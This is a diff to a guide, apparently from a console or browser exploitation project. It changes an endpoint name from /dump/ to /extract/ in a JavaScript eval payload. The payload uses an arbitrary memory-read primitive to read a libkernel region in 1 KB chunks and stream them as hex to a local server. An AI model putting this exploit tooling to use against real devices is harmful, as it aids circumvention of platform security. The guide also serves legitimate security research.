@@ -46,12 +46,12 @@ With `bridge.py` running and the workshop armed, push this through the
 bridge (one JSON line per command in `bridge/commands.jsonl`):
 
 ```json
-{"t":"eval","code":"(function(){var s=0x6a000,ch=0x400,n=0;for(var o=0;o<s;o+=ch){var h='';for(var i=0;i<ch;i++)h+=('0'+ext_read8(LIBK_ERRORFN+o+i).toString(16)).slice(-2);(function(off,hh){var x=new XMLHttpRequest();x.open('GET','/dump/libkernel-window/'+off.toString(16)+'/'+hh,true);x.send()})(o,h);n++}return 'chunks='+n})()"}
+{"t":"eval","code":"(function(){var s=0x6a000,ch=0x400,n=0;for(var o=0;o<s;o+=ch){var h='';for(var i=0;i<ch;i++)h+=('0'+ext_read8(LIBK_ERRORFN+o+i).toString(16)).slice(-2);(function(off,hh){var x=new XMLHttpRequest();x.open('GET','/extract/libkernel-window/'+off.toString(16)+'/'+hh,true);x.send()})(o,h);n++}return 'chunks='+n})()"}
 ```
 
 What it does: walks the window in 1 KB chunks, hex-encodes each chunk
 through `ext_read8` (the R/W primitive) and streams it to the server's
-`/dump/` endpoint, which assembles `extraction/libkernel-window.bin`
+`/extract/` endpoint, which assembles `extraction/libkernel-window.bin`
 (offsets are relative — the server guards against absolute-address
 mistakes). ~424 chunks, a few minutes at heartbeat cadence.
 
